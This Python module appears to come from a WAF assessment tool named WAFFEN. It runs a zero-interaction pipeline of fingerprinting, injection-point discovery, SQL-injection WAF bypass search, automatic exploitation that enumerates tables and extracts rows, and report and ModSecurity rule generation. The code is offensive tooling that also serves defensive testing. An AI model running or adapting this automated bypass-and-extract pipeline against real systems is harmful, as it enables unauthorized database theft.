"""Autonomous red team agent — zero-interaction WAF assessment.

Chains every WAFFEN module into a single pipeline:
  recon → profile → plan → bypass → exploit → report

Usage:
    waffen redteam --target https://your-waf.example --budget 5000
"""
from __future__ import annotations

import sys
import time
from dataclasses import dataclass, field
from typing import Optional, Sequence

from ..core.oracle import Target, Oracle


@dataclass
class RedTeamConfig:
    target_url: str
    path: str = "/"
    param: str = "q"
    inject: str = "query"
    method: str = "GET"
    max_budget: int = 5000
    attack_classes: list[str] = field(default_factory=lambda: ["SQL Injection"])
    goals: list[str] = field(default_factory=lambda: ["dump_database"])
    auto_exploit: bool = True
    generate_report: bool = True
    report_path: str = "redteam-report.html"
    rules_path: str = "redteam-rules.conf"
    transport: str = "auto"
    timeout: int = 15
    tls_verify: bool = False
    block_signature: str = ""
    cookie: str = ""
    extra_headers: tuple = ()


@dataclass
class RedTeamPhase:
    name: str
    status: str = "pending"
    duration_s: float = 0.0
    requests_used: int = 0
    findings: list = field(default_factory=list)
    intel: dict = field(default_factory=dict)
    summary: str = ""


@dataclass
class RedTeamResult:
    target: str
    phases: list[RedTeamPhase] = field(default_factory=list)
    total_requests: int = 0
    total_duration_s: float = 0.0
    bypasses_found: int = 0
    exploits_confirmed: int = 0
    report_path: str = ""
    rules_path: str = ""

    def as_dict(self) -> dict:
        return {
            "target": self.target,
            "total_requests": self.total_requests,
            "total_duration_s": round(self.total_duration_s, 1),
            "bypasses_found": self.bypasses_found,
            "exploits_confirmed": self.exploits_confirmed,
            "report_path": self.report_path,
            "rules_path": self.rules_path,
            "phases": [
                {"name": p.name, "status": p.status,
                 "duration_s": round(p.duration_s, 1),
                 "requests_used": p.requests_used,
                 "findings_count": len(p.findings),
                 "summary": p.summary}
                for p in self.phases
            ],
        }


class AutonomousRedTeam:
    """Zero-interaction autonomous WAF assessment agent."""

    def __init__(self, config: RedTeamConfig, sender=None):
        self.cfg = config
        self._sender = sender
        self._budget_remaining = config.max_budget
        self.phases: list[RedTeamPhase] = []

    def _target(self, **overrides) -> Target:
        kw = dict(
            base_url=self.cfg.target_url, path=self.cfg.path,
            param=self.cfg.param, inject=self.cfg.inject,
            method=self.cfg.method, timeout=self.cfg.timeout,
            tls_verify=self.cfg.tls_verify,
            block_signature=self.cfg.block_signature,
            cookie=self.cfg.cookie, extra_headers=self.cfg.extra_headers,
        )
        kw.update(overrides)
        return Target(**kw)

    def _oracle(self, calibration=None) -> Oracle:
        return Oracle(self._target(), sender=self._sender,
                      calibration=calibration, transport=self.cfg.transport)

    def _allocate(self, fraction: float) -> int:
        budget = max(10, int(self.cfg.max_budget * fraction))
        self._budget_remaining -= budget
        return budget

    def _log(self, msg: str):
        print(f"  {msg}", file=sys.stderr, flush=True)

    # ------------------------------------------------------------------
    def run(self) -> RedTeamResult:
        start = time.time()
        self._log("WAFFEN Autonomous Red Team")
        self._log(f"Target: {self.cfg.target_url}{self.cfg.path}")
        self._log(f"Budget: {self.cfg.max_budget} requests")
        self._log("")

        recon = self._phase_recon()
        profile = self._phase_profile(recon)
        plan = self._phase_plan(recon, profile)
        bypasses = self._phase_bypass(profile, plan)
        exploits = self._phase_exploit(bypasses) if self.cfg.auto_exploit else []
        report_path, rules_path = "", ""
        if self.cfg.generate_report:
            report_path, rules_path = self._phase_report(bypasses, exploits)

        result = RedTeamResult(
            target=self.cfg.target_url,
            phases=self.phases,
            total_requests=self.cfg.max_budget - self._budget_remaining,
            total_duration_s=time.time() - start,
            bypasses_found=len(bypasses),
            exploits_confirmed=len(exploits),
            report_path=report_path,
            rules_path=rules_path,
        )
        self._log_result(result)
        return result

    # ------------------------------------------------------------------
    # Phase 1: RECON
    # ------------------------------------------------------------------
    def _phase_recon(self) -> dict:
        phase = RedTeamPhase(name="recon", status="running")
        self.phases.append(phase)
        t0 = time.time()
        self._log("Phase 1: RECON")
        intel: dict = {}
        self._allocate(0.10)

        # Fingerprint
        try:
            from ..recon.fingerprint import fingerprint
            guesses = fingerprint(self._target())
            if guesses:
                waf = guesses[0]
                intel["waf_name"] = getattr(waf, "name", "unknown")
                intel["waf_confidence"] = getattr(waf, "confidence", 0.0)
                self._log(f"  WAF: {intel['waf_name']} ({intel['waf_confidence']:.0%})")
            else:
                intel["waf_name"] = "unknown"
                self._log("  WAF: not identified")
        except Exception as exc:
            intel["waf_name"] = "unknown"
            self._log(f"  Fingerprint error: {exc}")

        # Discover injection points
        try:
            from ..recon.discover import InjectionDiscovery
            disc = InjectionDiscovery(self._target())
            points = disc.discover()
            intel["injection_points"] = [
                {"location": p.location, "param": p.param, "waf_active": p.waf_active}
                for p in points
            ]
            waf_pts = [p for p in points if p.waf_active]
            self._log(f"  Injection points: {len(points)} total, {len(waf_pts)} WAF-active")
            if waf_pts and waf_pts[0].param != self.cfg.param:
                self.cfg.param = waf_pts[0].param
                self._log(f"  Auto-selected param: {self.cfg.param}")
        except Exception as exc:
            self._log(f"  Discovery error: {exc}")

        # Decision tree
        try:
            from ..recon.decision_tree import WAFDecisionTreeProber
            prober = WAFDecisionTreeProber(self._target())
            pipeline = prober.probe_all()
            recs = prober.recommend_mutations()
            intel["recommended_mutations"] = recs
            self._log(f"  Pipeline probed, {len(recs)} mutations recommended")
        except Exception as exc:
            self._log(f"  Decision tree error: {exc}")

        phase.duration_s = time.time() - t0
        phase.intel = intel
        phase.status = "completed"
        phase.summary = (f"WAF={intel.get('waf_name','?')}, "
                         f"{len(intel.get('injection_points', []))} injection points")
        self._log(f"  → {phase.summary} ({phase.duration_s:.1f}s)")
        self._log("")
        return intel

    # ------------------------------------------------------------------
    # Phase 2: PROFILE
    # ------------------------------------------------------------------
    def _phase_profile(self, recon: dict) -> dict:
        phase = RedTeamPhase(name="profile", status="running")
        self.phases.append(phase)
        t0 = time.time()
        self._log("Phase 2: PROFILE")
        intel: dict = {}
        self._allocate(0.15)

        # Calibrate
        calibration = None
        try:
            from ..verify.calibrate import calibrate
            oracle = self._oracle()
            calibration = calibrate(oracle)
            intel["waf_detected"] = getattr(calibration, "waf_detected", False)
            intel["confidence"] = getattr(calibration, "confidence", 0.0)
            self._log(f"  Calibrated: detected={intel['waf_detected']} conf={intel['confidence']:.0%}")
        except Exception as exc:
            self._log(f"  Calibrate error: {exc}")
        intel["calibration"] = calibration

        # Score probe
        try:
            from ..recon.score_probe import ScoreProber
            oracle = self._oracle(calibration=calibration)
            prober = ScoreProber(oracle)
            for cls in self.cfg.attack_classes[:2]:
                result = prober.run(cls)
                detected = sum(1 for k in result.keyword_map if k.detected)
                invisible = sum(1 for k in result.keyword_map if not k.detected)
                intel.setdefault("score_probes", {})[cls] = {
                    "detected": detected, "invisible": invisible,
                }
                self._log(f"  Score-probe ({cls}): {detected} detected, {invisible} invisible")
        except Exception as exc:
            self._log(f"  Score-probe error: {exc}")

        # libinjection gaps
        try:
            from ..recon.libinjection_gaps import LibinjectionGapHunter
            oracle = self._oracle(calibration=calibration)
            hunter = LibinjectionGapHunter(self._target(),
                                           sender=lambda p: oracle.send(p))
            reports = hunter.scan_all()
            total_gaps = sum(r.through for r in reports)
            intel["libinjection_gaps"] = total_gaps
            self._log(f"  libinjection gaps: {total_gaps}")
        except Exception as exc:
            self._log(f"  libinjection error: {exc}")

        phase.duration_s = time.time() - t0
        phase.intel = intel
        phase.status = "completed"
        phase.summary = (f"gaps={intel.get('libinjection_gaps', 0)}, "
                         f"waf={'yes' if intel.get('waf_detected') else 'no'}")
        self._log(f"  → {phase.summary} ({phase.duration_s:.1f}s)")
        self._log("")
        return intel

    # ------------------------------------------------------------------
    # Phase 3: PLAN
    # ------------------------------------------------------------------
    def _phase_plan(self, recon: dict, profile: dict) -> dict:
        phase = RedTeamPhase(name="plan", status="running")
        self.phases.append(phase)
        t0 = time.time()
        self._log("Phase 3: PLAN")
        intel: dict = {"goals": {}}

        try:
            from ..plan.planner import AttackPlanner
            planner = AttackPlanner(self._target())
            graph = planner.build_graph()
            intel["nodes"] = len(graph.nodes)
            intel["edges"] = len(graph.edges)
            self._log(f"  Attack graph: {intel['nodes']} nodes, {intel['edges']} edges")

            for goal in self.cfg.goals:
                plan = planner.plan_attack(goal)
                path_len = len(plan.best_path) if plan.best_path else 0
                intel["goals"][goal] = {
                    "path_length": path_len,
                    "bypasses_needed": sum(1 for e in (plan.best_path or []) if e.bypass_needed),
                }
                self._log(f"  Goal '{goal}': {path_len} steps")
        except Exception as exc:
            self._log(f"  Plan error: {exc}")

        phase.duration_s = time.time() - t0
        phase.intel = intel
        phase.status = "completed"
        phase.summary = f"{len(intel.get('goals', {}))} goals planned"
        self._log(f"  → {phase.summary} ({phase.duration_s:.1f}s)")
        self._log("")
        return intel

    # ------------------------------------------------------------------
    # Phase 4: BYPASS
    # ------------------------------------------------------------------
    def _phase_bypass(self, profile: dict, plan: dict) -> list:
        phase = RedTeamPhase(name="bypass", status="running")
        self.phases.append(phase)
        t0 = time.time()
        self._log("Phase 4: BYPASS SEARCH")
        budget = self._allocate(0.50)

        from ..engine import run_bypass
        from ..kb import seeds as kb_seeds

        all_findings: list = []
        calibration = profile.get("calibration")

        for cls in self.cfg.attack_classes:
            seeds = [(cls, p) for p in kb_seeds.seeds_for(cls)]
            if not seeds:
                self._log(f"  {cls}: no seeds, skipped")
                continue

            per_class = max(50, budget // max(len(self.cfg.attack_classes), 1))
            self._log(f"  {cls}: {len(seeds)} seeds, budget={per_class}")

            try:
                runs = run_bypass(
                    self._target(), seeds,
                    strategy="beam", max_requests=per_class,
                    do_calibrate=calibration is None,
                    do_verify=True, exploit_guided=True,
                    sender=self._sender, transport=self.cfg.transport,
                )
                for run in runs:
                    for f in run.result.findings:
                        all_findings.append({
                            "attack_class": cls,
                            "payload": f.payload,
                            "chain": list(getattr(f, "chain", [])),
                            "transform": getattr(f, "transform", "identity"),
                            "code": getattr(f, "code", ""),
                            "verified": bool(getattr(f, "verified", False)),
                        })
                verified = [f for f in all_findings if f["verified"]]
                self._log(f"  {cls}: {len(all_findings)} findings, {len(verified)} verified")
            except Exception as exc:
                self._log(f"  {cls} search error: {exc}")

        phase.duration_s = time.time() - t0
        phase.findings = all_findings
        phase.requests_used = budget
        phase.status = "completed"
        verified = [f for f in all_findings if f["verified"]]
        phase.summary = f"{len(all_findings)} findings, {len(verified)} verified"
        self._log(f"  → {phase.summary} ({phase.duration_s:.1f}s)")
        self._log("")
        return all_findings

    # ------------------------------------------------------------------
    # Phase 5: EXPLOIT
    # ------------------------------------------------------------------
    def _phase_exploit(self, bypasses: list) -> list:
        phase = RedTeamPhase(name="exploit", status="running")
        self.phases.append(phase)
        t0 = time.time()
        self._log("Phase 5: EXPLOIT")

        sqli_bypasses = [b for b in bypasses
                         if b.get("verified") and "sql" in b.get("attack_class", "").lower()]

        if not sqli_bypasses:
            self._log("  No verified SQLi bypasses to exploit")
            phase.status = "skipped"
            phase.summary = "no exploitable bypasses"
            phase.duration_s = time.time() - t0
            self._log("")
            return []

        exploits: list = []
        self._allocate(0.20)

        from ..exploit.sqli import SQLiExploiter

        for bp in sqli_bypasses[:3]:
            try:
                exploiter = SQLiExploiter(
                    self._target(),
                    bypass_payload=bp["payload"],
                    bypass_chain=tuple(bp.get("chain", [])),
                    transform=bp.get("transform", "identity"),
                    sender=self._sender,
                    transport=self.cfg.transport,
                )
                dbms = exploiter.detect_dbms()
                self._log(f"  DBMS: {dbms or 'unknown'}")

                if dbms:
                    tables = exploiter.enumerate_tables()
                    self._log(f"  Tables: {tables[:5]}")

                    if tables:
                        exploit_data = {
                            "bypass_payload": bp["payload"],
                            "dbms": dbms,
                            "tables": tables[:10],
                            "sample_data": {},
                        }
                        for tbl in tables[:2]:
                            try:
                                cols = exploiter.enumerate_columns(tbl)
                                result = exploiter.extract(tbl, columns=cols[:3], limit=5)
                                exploit_data["sample_data"][tbl] = {
                                    "columns": cols[:5],
                                    "rows": len(getattr(result, "data", [])),
                                }
                                self._log(f"  {tbl}: {len(cols)} cols, extracted {len(getattr(result, 'data', []))} rows")
                            except Exception:
                                pass
                        exploits.append(exploit_data)
            except Exception as exc:
                self._log(f"  Exploit error: {exc}")

        phase.duration_s = time.time() - t0
        phase.findings = exploits
        phase.status = "completed"
        phase.summary = f"{len(exploits)} successful exploits"
        self._log(f"  → {phase.summary} ({phase.duration_s:.1f}s)")
        self._log("")
        return exploits

    # ------------------------------------------------------------------
    # Phase 6: REPORT
    # ------------------------------------------------------------------
    def _phase_report(self, bypasses: list, exploits: list) -> tuple[str, str]:
        phase = RedTeamPhase(name="report", status="running")
        self.phases.append(phase)
        t0 = time.time()
        self._log("Phase 6: REPORT")
        report_path = ""
        rules_path = ""

        # HTML report
        try:
            from ..report.professional import generate_html_report, ReportConfig, write_html_report
            config = ReportConfig(
                title="WAFFEN Autonomous Red Team Assessment",
                target=f"{self.cfg.target_url}{self.cfg.path}",
            )
            html = generate_html_report(bypasses, config=config)
            report_path = self.cfg.report_path
            write_html_report(html, report_path)
            self._log(f"  HTML report: {report_path}")
        except Exception as exc:
            self._log(f"  Report error: {exc}")

        # WAF defense rules
        try:
            from ..report.defend import generate_rules
            verified = [b for b in bypasses if b.get("verified")]
            if verified:
                rules = generate_rules(verified, engine="modsecurity")
                rules_path = self.cfg.rules_path
                from ..report.defend import render_rules
                rendered = render_rules(rules, engine="modsecurity")
                with open(rules_path, "w") as f:
                    f.write(rendered)
                self._log(f"  WAF rules: {rules_path} ({len(rules)} rules)")
        except Exception as exc:
            self._log(f"  Rules error: {exc}")

        phase.duration_s = time.time() - t0
        phase.status = "completed"
        phase.summary = f"report={report_path}, rules={rules_path}"
        self._log(f"  → {phase.summary} ({phase.duration_s:.1f}s)")
        self._log("")
        return report_path, rules_path

    # ------------------------------------------------------------------
    def _log_result(self, result: RedTeamResult):
        self._log("━" * 40)
        self._log(f"Total: {result.total_duration_s:.1f}s, {result.total_requests} requests")
        self._log(f"Bypasses: {result.bypasses_found} | Exploits: {result.exploits_confirmed}")
        if result.report_path:
            self._log(f"Report: {result.report_path}")
        if result.rules_path:
            self._log(f"Rules: {result.rules_path}")

        grade = "INFO"
        if result.exploits_confirmed > 0:
            grade = "CRITICAL"
        elif result.bypasses_found > 0:
            grade = "HIGH"
        self._log(f"Grade: {grade}")
